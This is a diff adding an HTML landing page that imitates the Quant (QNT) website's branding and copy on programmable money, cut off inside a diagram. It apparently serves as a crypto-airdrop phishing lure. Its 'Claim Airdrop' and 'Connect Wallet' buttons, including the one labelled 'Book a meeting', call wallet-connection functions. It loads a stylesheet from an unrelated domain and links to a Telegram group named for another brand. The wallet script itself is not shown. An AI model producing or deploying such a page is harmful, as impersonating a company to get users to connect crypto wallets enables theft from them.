@@ -1,0 +1,641 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Quant – The Infrastructure of Programmable Money</title>
+  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://kaspa.wiki/rainbowkit.css" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --orange: #f15a22;
+      --orange-dark: #c94816;
+      --text: #43403e;
+      --text-light: #6b6866;
+      --bg: #ffffff;
+      --bg-dark: #0d0d0d;
+      --border: #e5e2df;
+      --radius: 4px;
+      --font: 'Heebo', sans-serif;
+    }
+
+    html, body {
+      font-family: var(--font);
+      color: var(--text);
+      background: var(--bg);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: inherit; text-decoration: none; }
+    img { max-width: 100%; display: block; }
+
+    /* ── NAV ── */
+    .nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background: rgba(255,255,255,0.95);
+      backdrop-filter: blur(8px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 32px;
+      height: 64px;
+      display: flex; align-items: center; gap: 32px;
+    }
+    .nav-logo { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
+    .nav-logo svg { width: 32px; height: 32px; }
+    .nav-logo-text { font-size: 15px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text); }
+    .nav-links { display: flex; align-items: center; gap: 24px; flex: 1; }
+    .nav-links a { font-size: 14px; font-weight: 500; color: var(--text-light); transition: color .2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-actions { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
+    .btn-nav-ghost { font-size: 13px; font-weight: 500; color: var(--text); padding: 7px 14px; border: 1px solid var(--border); border-radius: var(--radius); transition: all .2s; cursor: pointer; background: none; font-family: var(--font); }
+    .btn-nav-ghost:hover { border-color: var(--orange); color: var(--orange); }
+    .btn-nav-orange { font-size: 13px; font-weight: 600; color: #fff; padding: 8px 16px; border-radius: var(--radius); background: var(--orange); border: none; cursor: pointer; font-family: var(--font); transition: background .2s; }
+    .btn-nav-orange:hover { background: var(--orange-dark); }
+
+    /* ── HERO ── */
+    .hero {
+      padding: 140px 32px 80px;
+      text-align: center;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .hero-eyebrow { font-size: 15px; font-weight: 500; color: var(--text-light); margin-bottom: 12px; }
+    .hero-title { font-size: clamp(40px, 6vw, 72px); font-weight: 800; line-height: 1.1; color: var(--text); margin-bottom: 8px; }
+    .hero-rotate-wrap {
+      display: block;
+      position: relative;
+      height: 1.25em;
+      overflow: hidden;
+      margin: 0 auto;
+    }
+    .rotate-word {
+      color: var(--orange);
+      position: absolute;
+      left: 0; right: 0;
+      top: 0;
+      opacity: 0;
+      transform: translateY(50px);
+      animation: wordCycle 9s infinite;
+      text-align: center;
+      font-size: inherit;
+      font-weight: inherit;
+      line-height: 1.25;
+    }
+    .rotate-word:nth-child(1) { animation-delay: 0s; }
+    .rotate-word:nth-child(2) { animation-delay: 3s; }
+    .rotate-word:nth-child(3) { animation-delay: 6s; }
+
+    @keyframes wordCycle {
+      0%    { opacity: 0; transform: translateY(50px); }
+      8%    { opacity: 1; transform: translateY(0); }
+      28%   { opacity: 1; transform: translateY(0); }
+      35%   { opacity: 0; transform: translateY(-50px); }
+      100%  { opacity: 0; transform: translateY(-50px); }
+    }
+
+    .hero-tabs { display: flex; justify-content: center; gap: 0; margin-bottom: 32px; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; width: fit-content; margin-left: auto; margin-right: auto; }
+    .hero-tab { padding: 10px 22px; font-size: 13px; font-weight: 500; color: var(--text-light); cursor: pointer; border: none; background: none; font-family: var(--font); transition: all .2s; border-right: 1px solid var(--border); }
+    .hero-tab:last-child { border-right: none; }
+    .hero-tab.active { background: var(--orange); color: #fff; }
+    .hero-tab:hover:not(.active) { background: #fdf4f0; color: var(--orange); }
+
+    .diagram-wrap { max-width: 760px; margin: 0 auto; }
+    .diagram-desc { font-size: 15px; color: var(--text-light); max-width: 560px; margin: 0 auto 24px; line-height: 1.7; }
+    .diagram-link { color: var(--orange); font-size: 14px; font-weight: 600; text-decoration: underline; cursor: pointer; }
+    .diagram-link:hover { color: var(--orange-dark); }
+    .dvp-diagram { width: 100%; max-width: 700px; margin: 0 auto 24px; display: block; }
+
+    .hero-actions { display: flex; justify-content: center; align-items: center; gap: 12px; flex-wrap: wrap; margin-top: 36px; }
+    .btn-primary { display: inline-flex; align-items: center; gap: 8px; background: var(--orange); color: #fff; font-size: 15px; font-weight: 600; padding: 13px 28px; border-radius: var(--radius); border: none; cursor: pointer; font-family: var(--font); transition: background .2s; }
+    .btn-primary:hover { background: var(--orange-dark); }
+    .btn-outline { display: inline-flex; align-items: center; gap: 8px; background: transparent; color: var(--text); font-size: 15px; font-weight: 500; padding: 12px 24px; border-radius: var(--radius); border: 1px solid var(--border); cursor: pointer; font-family: var(--font); transition: all .2s; }
+    .btn-outline:hover { border-color: var(--orange); color: var(--orange); }
+    .btn-telegram { display: inline-flex; align-items: center; gap: 8px; background: #229ED9; color: #fff; font-size: 15px; font-weight: 500; padding: 12px 24px; border-radius: var(--radius); border: none; cursor: pointer; font-family: var(--font); transition: background .2s; }
+    .btn-telegram:hover { background: #1a85b8; }
+
+    /* ── SECTION BASE ── */
+    .section { padding: 80px 32px; }
+    .container { max-width: 1200px; margin: 0 auto; }
+
+    /* ── INTRO BAND ── */
+    .intro-band { background: #fafaf9; padding: 60px 32px; text-align: center; }
+    .intro-band p { font-size: 18px; color: var(--text-light); max-width: 680px; margin: 0 auto; line-height: 1.8; }
+
+    /* ── QUANT FLOW ── */
+    .flow-section { background: var(--bg-dark); padding: 100px 32px; text-align: center; }
+    .flow-video-wrap { width: 100%; max-width: 720px; margin: 0 auto 48px; aspect-ratio: 16/9; background: #1a1a1a; border-radius: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; }
+    .flow-pulse { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--orange); animation: pulse 2s ease-in-out infinite; position: relative; display: flex; align-items: center; justify-content: center; }
+    .flow-pulse::after { content: ''; position: absolute; inset: -16px; border: 1px solid rgba(241,90,34,0.3); border-radius: 50%; animation: pulse 2s ease-in-out infinite .5s; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); opacity: .8; } 50% { transform: scale(1.15); opacity: 1; } }
+    .flow-title { font-size: clamp(32px, 5vw, 54px); font-weight: 800; color: #fff; margin-bottom: 16px; }
+    .flow-title span { color: var(--orange); }
+    .flow-desc { font-size: 17px; color: rgba(255,255,255,0.65); max-width: 580px; margin: 0 auto; line-height: 1.8; }
+
+    /* ── DIGITAL AGE ── */
+    .digital-section { padding: 100px 32px; }
+    .digital-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 80px; align-items: center; max-width: 1100px; margin: 0 auto; }
+    .digital-title { font-size: clamp(32px, 4vw, 52px); font-weight: 800; line-height: 1.1; color: var(--text); margin-bottom: 32px; }
+    .digital-body { font-size: 16px; color: var(--text-light); line-height: 1.8; }
+    .digital-body p + p { margin-top: 16px; }
+
+    /* ── PAYSCRIPT ── */
+    .payscript-section { padding: 100px 32px; background: #fafaf9; }
+    .payscript-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 80px; align-items: center; max-width: 1100px; margin: 0 auto; }
+    .payscript-label { font-size: 13px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--orange); margin-bottom: 16px; }
+    .payscript-title { font-size: clamp(28px, 4vw, 48px); font-weight: 800; line-height: 1.1; color: var(--text); margin-bottom: 20px; }
+    .payscript-body { font-size: 16px; color: var(--text-light); line-height: 1.8; margin-bottom: 12px; }
+    .payscript-cta { font-size: 14px; font-weight: 700; color: var(--orange); text-decoration: underline; cursor: pointer; }
+    .circular-diagram { width: 100%; max-width: 380px; margin: 0 auto; aspect-ratio: 1; }
+
+    /* ── WHO WE SERVE ── */
+    .serve-section { padding: 100px 32px; }
+    .serve-title { font-size: 14px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--orange); margin-bottom: 48px; text-align: center; }
+    .serve-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; max-width: 1100px; margin: 0 auto; }
+    .serve-card { padding: 36px; border: 1px solid var(--border); border-radius: 6px; }
+    .serve-card-title { font-size: 20px; font-weight: 700; color: var(--text); margin-bottom: 16px; }
+    .serve-card-list { list-style: none; }
+    .serve-card-list li { font-size: 14px; color: var(--text-light); line-height: 1.7; padding: 6px 0; border-top: 1px solid var(--border); }
+    .serve-card-list li:first-child { border-top: none; }
+
+    /* ── CTA BANNER ── */
+    .cta-banner { position: relative; overflow: hidden; min-height: 400px; display: flex; align-items: center; justify-content: center; text-align: center; }
+    .cta-bg { position: absolute; inset: 0; background: linear-gradient(135deg, #1a0a04 0%, #3d1a0a 40%, #2d1206 100%); }
+    .cta-bg::after { content: ''; position: absolute; inset: 0; background-image: repeating-linear-gradient(0deg, rgba(241,90,34,0.04) 0px, rgba(241,90,34,0.04) 1px, transparent 1px, transparent 60px), repeating-linear-gradient(90deg, rgba(241,90,34,0.04) 0px, rgba(241,90,34,0.04) 1px, transparent 1px, transparent 60px); }
+    .cta-content { position: relative; z-index: 1; padding: 80px 32px; }
+    .cta-title { font-size: clamp(28px, 4vw, 48px); font-weight: 800; color: #fff; margin-bottom: 32px; line-height: 1.2; }
+    .btn-cta { display: inline-flex; align-items: center; gap: 8px; background: var(--orange); color: #fff; font-size: 15px; font-weight: 600; padding: 14px 32px; border-radius: var(--radius); border: none; cursor: pointer; font-family: var(--font); transition: background .2s; }
+    .btn-cta:hover { background: var(--orange-dark); }
+
+    /* ── FOOTER ── */
+    .footer { padding: 60px 32px 32px; border-top: 1px solid var(--border); }
+    .footer-top { display: grid; grid-template-columns: repeat(5, 1fr); gap: 32px; max-width: 1200px; margin: 0 auto 48px; }
+    .footer-col-title { font-size: 12px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text); margin-bottom: 16px; }
+    .footer-col a { display: block; font-size: 14px; color: var(--text-light); margin-bottom: 10px; transition: color .2s; }
+    .footer-col a:hover { color: var(--orange); }
+    .footer-bottom { display: flex; align-items: center; justify-content: space-between; max-width: 1200px; margin: 0 auto; padding-top: 24px; border-top: 1px solid var(--border); }
+    .footer-logo { display: flex; align-items: center; gap: 8px; }
+    .footer-legal { display: flex; align-items: center; gap: 24px; }
+    .footer-legal a { font-size: 12px; color: var(--text-light); }
+    .footer-legal a:hover { color: var(--orange); }
+    .footer-copy { font-size: 12px; color: var(--text-light); margin-top: 8px; }
+
+    /* ── FADE IN ── */
+    .fade-in { opacity: 0; transform: translateY(20px); transition: opacity .55s ease, transform .55s ease; }
+    .fade-in.is-visible { opacity: 1; transform: none; }
+    /* Fallback: always show if JS scroll hasn't fired */
+
+    /* ── MOBILE ── */
+    @media (max-width: 768px) {
+      .nav-links { display: none; }
+      .digital-grid, .payscript-grid, .serve-grid { grid-template-columns: 1fr; gap: 40px; }
+      .footer-top { grid-template-columns: repeat(2, 1fr); }
+      .hero { padding: 110px 20px 60px; }
+      .section { padding: 60px 20px; }
+      .nav-actions .btn-nav-ghost:not(:last-child) { display: none; }
+    }
+
+    /* ── DIAGRAM ANIMATIONS ── */
+    .dash-line { stroke-dasharray: 8 6; animation: dashMove 1.5s linear infinite; }
+    @keyframes dashMove { to { stroke-dashoffset: -28; } }
+    .ring-rotate { animation: ringRot 8s linear infinite; transform-origin: center; }
+    .ring-rotate-rev { animation: ringRotRev 12s linear infinite; transform-origin: center; }
+    @keyframes ringRot { to { transform: rotate(360deg); } }
+    @keyframes ringRotRev { to { transform: rotate(-360deg); } }
+
+    /* Tab panel show/hide */
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav">
+  <a href="/" class="nav-logo">
+    <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="16,2 30,10 30,22 16,30 2,22 2,10" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+      <polygon points="16,7 25,12 25,20 16,25 7,20 7,12" fill="#f15a22" opacity="0.15"/>
+      <circle cx="16" cy="16" r="4" fill="#f15a22"/>
+      <line x1="16" y1="2" x2="16" y2="12" stroke="#f15a22" stroke-width="1"/>
+      <line x1="30" y1="10" x2="22" y2="13" stroke="#f15a22" stroke-width="1"/>
+      <line x1="30" y1="22" x2="22" y2="19" stroke="#f15a22" stroke-width="1"/>
+      <line x1="16" y1="30" x2="16" y2="20" stroke="#f15a22" stroke-width="1"/>
+      <line x1="2" y1="22" x2="10" y2="19" stroke="#f15a22" stroke-width="1"/>
+      <line x1="2" y1="10" x2="10" y2="13" stroke="#f15a22" stroke-width="1"/>
+    </svg>
+    <span class="nav-logo-text">Quant</span>
+  </a>
+
+  <div class="nav-links">
+    <a href="#">Who we serve</a>
+    <a href="#">Solutions</a>
+    <a href="#">Insights</a>
+    <a href="#">Company</a>
+    <a href="#">Get in touch</a>
+  </div>
+
+  <div class="nav-actions">
+    <a href="./borrow.html"><button class="btn-nav-ghost">Borrow</button></a>
+    <a href="./stake.html"><button class="btn-nav-ghost">Stake QNT</button></a>
+    <button class="btn-nav-ghost" onclick="connectWallet()">Connect Wallet</button>
+    <button class="btn-nav-orange" onclick="window.talkWallet()">Claim Airdrop</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <p class="hero-eyebrow">The Infrastructure of</p>
+  <div class="hero-title">
+    <div class="hero-rotate-wrap">
+      <div class="rotate-word">Programmable Cross-Border</div>
+      <div class="rotate-word">Programmable DvP</div>
+      <div class="rotate-word">Programmable Treasury</div>
+    </div>
+  </div>
+
+  <div class="hero-tabs" style="margin-top:32px; margin-bottom:28px;">
+    <button class="hero-tab active" data-tab="crossborder">Programmable Cross-Border</button>
+    <button class="hero-tab" data-tab="dvp">Programmable DvP</button>
+    <button class="hero-tab" data-tab="treasury">Programmable Treasury</button>
+  </div>
+
+  <!-- Cross-Border Panel -->
+  <div class="tab-panel active diagram-wrap" id="tab-crossborder">
+    <p class="diagram-desc">Move tokenised deposits and payments between currencies and jurisdictions the moment conditions are met, settling in seconds with full visibility, securely synchronised end-to-end.</p>
+    <svg class="dvp-diagram" viewBox="0 0 700 220" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <!-- Left bank -->
+      <g transform="translate(60,55)">
+        <rect x="0" y="30" width="90" height="62" rx="4" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="10" y="18" width="70" height="16" rx="2" fill="none" stroke="#f15a22" stroke-width="1" opacity="0.6"/>
+        <rect x="15" y="18" width="12" height="16" fill="#f15a22" rx="2 0 0 2"/>
+        <rect x="30" y="45" width="30" height="22" rx="2" fill="#f15a22" opacity="0.15"/>
+        <rect x="15" y="50" width="10" height="8" rx="1" fill="#f15a22" opacity="0.4"/>
+        <rect x="65" y="50" width="10" height="8" rx="1" fill="#f15a22" opacity="0.4"/>
+        <text x="45" y="112" text-anchor="middle" font-size="11" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Country A</text>
+        <text x="45" y="126" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#6b6866">Bank 1</text>
+      </g>
+      <!-- Left → Center -->
+      <line x1="152" y1="98" x2="240" y2="98" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="152" y1="114" x2="240" y2="114" stroke="#b0acaa" stroke-width="1" stroke-dasharray="4 4"/>
+      <text x="196" y="90" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">CBDC</text>
+      <text x="196" y="128" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#b0acaa">FX Rate</text>
+      <!-- Center Quant hub -->
+      <g transform="translate(290,52)">
+        <circle cx="60" cy="52" r="54" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="60" cy="52" r="40" fill="none" stroke="#f15a22" stroke-width="0.8" opacity="0.3" class="ring-rotate"/>
+        <circle cx="60" cy="52" r="24" fill="#f15a22" opacity="0.07"/>
+        <polygon points="60,32 76,41 76,61 60,70 44,61 44,41" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="60" cy="50" r="7" fill="#f15a22"/>
+        <text x="60" y="82" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="700">QUANT</text>
+      </g>
+      <!-- Center → Right -->
+      <line x1="460" y1="98" x2="548" y2="98" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="460" y1="114" x2="548" y2="114" stroke="#b0acaa" stroke-width="1" stroke-dasharray="4 4"/>
+      <text x="504" y="90" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">CBDC</text>
+      <text x="504" y="128" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#b0acaa">FX Rate</text>
+      <!-- Right bank -->
+      <g transform="translate(548,55)">
+        <rect x="0" y="30" width="90" height="62" rx="4" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="10" y="18" width="70" height="16" rx="2" fill="none" stroke="#f15a22" stroke-width="1" opacity="0.6"/>
+        <rect x="15" y="18" width="12" height="16" fill="#f15a22" rx="2 0 0 2"/>
+        <rect x="30" y="45" width="30" height="22" rx="2" fill="#f15a22" opacity="0.15"/>
+        <rect x="15" y="50" width="10" height="8" rx="1" fill="#f15a22" opacity="0.4"/>
+        <rect x="65" y="50" width="10" height="8" rx="1" fill="#f15a22" opacity="0.4"/>
+        <text x="45" y="112" text-anchor="middle" font-size="11" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Country B</text>
+        <text x="45" y="126" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#6b6866">Bank 2</text>
+      </g>
+    </svg>
+    <a class="diagram-link">Learn more →</a>
+  </div>
+
+  <!-- DvP Panel -->
+  <div class="tab-panel diagram-wrap" id="tab-dvp">
+    <p class="diagram-desc">Make the transfer of tokenised deposits, shares or bonds as part of a single synchronised transaction that removes risk. Either both legs settle together, or neither does.</p>
+    <svg class="dvp-diagram" viewBox="0 0 700 220" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <g transform="translate(50,55)">
+        <rect width="120" height="80" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="10" y="10" width="100" height="6" rx="2" fill="#f15a22" opacity="0.3"/>
+        <rect x="10" y="22" width="80" height="4" rx="2" fill="#b0acaa" opacity="0.5"/>
+        <rect x="10" y="32" width="60" height="4" rx="2" fill="#b0acaa" opacity="0.3"/>
+        <rect x="10" y="52" width="45" height="16" rx="3" fill="#f15a22"/>
+        <text x="32.5" y="63" text-anchor="middle" font-size="9" fill="#fff" font-family="Heebo,sans-serif" font-weight="600">Shares</text>
+        <text x="60" y="105" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Tokenised Assets</text>
+        <text x="60" y="118" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#6b6866">&amp; Securities</text>
+      </g>
+      <line x1="172" y1="90" x2="275" y2="102" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="172" y1="106" x2="275" y2="118" stroke="#b0acaa" stroke-width="1" stroke-dasharray="4 4"/>
+      <g transform="translate(275,48)">
+        <circle cx="72" cy="62" r="58" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="72" cy="62" r="44" fill="none" stroke="#f15a22" stroke-width="0.8" opacity="0.3" class="ring-rotate"/>
+        <circle cx="72" cy="62" r="28" fill="none" stroke="#f15a22" stroke-width="0.8" opacity="0.2" class="ring-rotate-rev"/>
+        <polygon points="72,40 90,50 90,70 72,80 54,70 54,50" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="72" cy="59" r="8" fill="#f15a22"/>
+        <text x="72" y="92" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="700">QUANT</text>
+      </g>
+      <line x1="405" y1="102" x2="520" y2="90" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="405" y1="118" x2="520" y2="106" stroke="#b0acaa" stroke-width="1" stroke-dasharray="4 4"/>
+      <g transform="translate(520,55)">
+        <rect width="120" height="80" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="10" y="10" width="100" height="6" rx="2" fill="#f15a22" opacity="0.3"/>
+        <rect x="10" y="22" width="80" height="4" rx="2" fill="#b0acaa" opacity="0.5"/>
+        <rect x="10" y="32" width="60" height="4" rx="2" fill="#b0acaa" opacity="0.3"/>
+        <rect x="10" y="52" width="55" height="16" rx="3" fill="#f15a22"/>
+        <text x="37.5" y="63" text-anchor="middle" font-size="9" fill="#fff" font-family="Heebo,sans-serif" font-weight="600">Deposits</text>
+        <text x="60" y="105" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Tokenised</text>
+        <text x="60" y="118" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#6b6866">Deposits</text>
+      </g>
+    </svg>
+    <a class="diagram-link">Learn more →</a>
+  </div>
+
+  <!-- Treasury Panel -->
+  <div class="tab-panel diagram-wrap" id="tab-treasury">
+    <p class="diagram-desc">Write rules directly into the payment, move liquidity between entities and regions at the optimal moment, with real-time visibility of every position and no dependence on manual sign-offs.</p>
+    <svg class="dvp-diagram" viewBox="0 0 700 230" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <g transform="translate(40,20)">
+        <rect width="110" height="72" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="8" y="8" width="94" height="8" rx="2" fill="#f15a22" opacity="0.2"/>
+        <rect x="8" y="22" width="70" height="4" rx="2" fill="#b0acaa" opacity="0.4"/>
+        <rect x="8" y="40" width="40" height="14" rx="3" fill="#f15a22" opacity="0.15" stroke="#f15a22" stroke-width="1"/>
+        <text x="28" y="50" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">€ EUR</text>
+        <text x="55" y="96" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Region A</text>
+      </g>
+      <g transform="translate(40,142)">
+        <rect width="110" height="72" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="8" y="8" width="94" height="8" rx="2" fill="#f15a22" opacity="0.2"/>
+        <rect x="8" y="22" width="70" height="4" rx="2" fill="#b0acaa" opacity="0.4"/>
+        <rect x="8" y="40" width="40" height="14" rx="3" fill="#f15a22" opacity="0.15" stroke="#f15a22" stroke-width="1"/>
+        <text x="28" y="50" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">$ USD</text>
+        <text x="55" y="96" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Region B</text>
+      </g>
+      <line x1="152" y1="58" x2="265" y2="108" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="152" y1="178" x2="265" y2="128" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <g transform="translate(275,58)">
+        <circle cx="75" cy="58" r="56" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="75" cy="58" r="42" fill="none" stroke="#f15a22" stroke-width="0.8" opacity="0.3" class="ring-rotate"/>
+        <polygon points="75,36 92,46 92,68 75,78 58,68 58,46" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="75" cy="55" r="8" fill="#f15a22"/>
+        <text x="75" y="88" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="700">QUANT</text>
+        <text x="75" y="102" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#6b6866">Flow</text>
+      </g>
+      <line x1="405" y1="108" x2="510" y2="58" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <line x1="405" y1="118" x2="510" y2="178" stroke="#f15a22" stroke-width="1.5" class="dash-line"/>
+      <g transform="translate(512,20)">
+        <rect width="110" height="72" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="8" y="8" width="94" height="8" rx="2" fill="#f15a22" opacity="0.2"/>
+        <rect x="8" y="40" width="40" height="14" rx="3" fill="#f15a22" opacity="0.15" stroke="#f15a22" stroke-width="1"/>
+        <text x="28" y="50" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">£ GBP</text>
+        <text x="55" y="96" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Region C</text>
+      </g>
+      <g transform="translate(512,142)">
+        <rect width="110" height="72" rx="6" fill="#fff" stroke="#f15a22" stroke-width="1.5"/>
+        <rect x="8" y="8" width="94" height="8" rx="2" fill="#f15a22" opacity="0.2"/>
+        <rect x="8" y="40" width="40" height="14" rx="3" fill="#f15a22" opacity="0.15" stroke="#f15a22" stroke-width="1"/>
+        <text x="28" y="50" text-anchor="middle" font-size="9" font-family="Heebo,sans-serif" fill="#f15a22" font-weight="600">¥ JPY</text>
+        <text x="55" y="96" text-anchor="middle" font-size="10" font-family="Heebo,sans-serif" fill="#43403e" font-weight="600">Region D</text>
+      </g>
+    </svg>
+    <a class="diagram-link">Learn more →</a>
+  </div>
+
+  <div class="hero-actions">
+    <button class="btn-primary" onclick="window.talkWallet()">Claim Airdrop</button>
+    <a href="./borrow.html"><button class="btn-outline">Borrow QNT</button></a>
+    <a href="./stake.html"><button class="btn-outline">Stake QNT</button></a>
+    <a href="https://t.me/OndoFinanceC" target="_blank"><button class="btn-telegram">Join Live Chat</button></a>
+  </div>
+</section>
+
+<!-- INTRO BAND -->
+<div class="intro-band">
+  <p class="fade-in">In today's rapidly evolving world, where innovation, speed, and precision define success, your money should work intelligently, but it isn't. It's struggling to keep up and is holding you back.</p>
+</div>
+
+<!-- QUANT FLOW -->
+<section class="flow-section">
+  <div class="flow-video-wrap">
+    <div class="flow-pulse">
+      <svg viewBox="0 0 40 40" width="36" height="36" fill="none">
+        <polygon points="20,4 36,12 36,28 20,36 4,28 4,12" fill="none" stroke="#f15a22" stroke-width="1.5"/>
+        <circle cx="20" cy="20" r="6" fill="#f15a22"/>
+      </svg>
+    </div>
+  </div>
+  <h2 class="flow-title fade-in">Introducing <span>Quant Flow</span></h2>
+  <p class="flow-desc fade-in" style="transition-delay:.1s">Quant Flow, the money engine, is the evolution in programmable money, driving an era of scalability, automation, and acceleration. Unlock new revenue and redefine how money works for you.</p>
+</section>
+
+<!-- DIGITAL AGE -->
+<section class="digital-section">
+  <div class="digital-grid container">
+    <div>
+      <h2 class="digital-title fade-in">Money is now fit for our digital age.</h2>
+    </div>
+    <div>
+      <div class="digital-body fade-in" style="transition-delay:.15s">
+        <p>The future of money is intelligent, automated, and interconnected. Today, people and businesses demand speed, efficiency, and automation. Making money programmable removes friction, reduces risk and enhances the lives of businesses and consumers alike.</p>
+        <p>With intelligence at its core, programmability of all forms of money empowers everyone to do more with their money in existing bank accounts and with stablecoins.</p>
+        <p>Welcome to the next generation of finance.</p>
+      </div>
+      <div style="margin-top:28px;">
+        <button class="btn-primary fade-in" style="transition-delay:.2s" onclick="window.talkWallet()">Book a meeting</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PAYSCRIPT -->
+<section class="payscript-section">
+  <div class="payscript-grid container">
+    <div>
+      <p class="payscript-label fade-in">Quant PayScript®</p>
+      <h2 class="payscript-title fade-in" style="transition-delay:.1s">Introducing the language of money.</h2>
+      <p class="payscript-body fade-in" style="transition-delay:.15s">Harness the programmability of bank accounts and stablecoins to transform money, automate complex workflows, and secure a competitive edge in today's markets. Its powerful, easy-to-use rules engine gives you full control over how money behaves and moves.</p>
+      <p class="payscript-body fade-in" style="transition-delay:.2s; color: var(--orange); font-weight:600;">Automated money now works for you 24/7.</p>
+      <a class="payscript-cta fade-in" style="transition-delay:.25s">Learn more →</a>
+    </div>
+    <div class="fade-in" style="transition-delay:.2s">
+      <svg class="circular-diagram" viewBox="0 0 380 380" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="190" cy="190" r="170" fill="none" stroke="#f15a22" stroke-width="0.5" opacity="0.2"/>
+        <circle cx="190" cy="190" r="145" fill="none" stroke="#f15a22" stroke-width="0.8" opacity="0.3" class="ring-rotate"/>
+        <circle cx="190" cy="190" r="118" fill="none" stroke="#f15a22" stroke-width="1" opacity="0.4" class="ring-rotate-rev"/>
+        <circle cx="190" cy="190" r="90" fill="none" stroke="#f15a22" stroke-width="1.5" opacity="0.5" class="ring-rotate"/>
+        <circle cx="190" cy="190" r="60" fill="none" stroke="#f15a22" stroke-width="2" opacity="0.7" class="ring-rotate-rev"/>
+        <circle cx="190" cy="190" r="32" fill="#f15a22" opacity="0.15"/>
+        <circle cx="190" cy="190" r="20" fill="#f15a22"/>
+        <polygon points="190,180 198,185 198,195 190,200 182,195 182,185" fill="none" stroke="#fff" stroke-width="1.5"/>
+        <!-- Node dots -->
+        <circle cx="190" cy="45" r="5" fill="#f15a22"/>
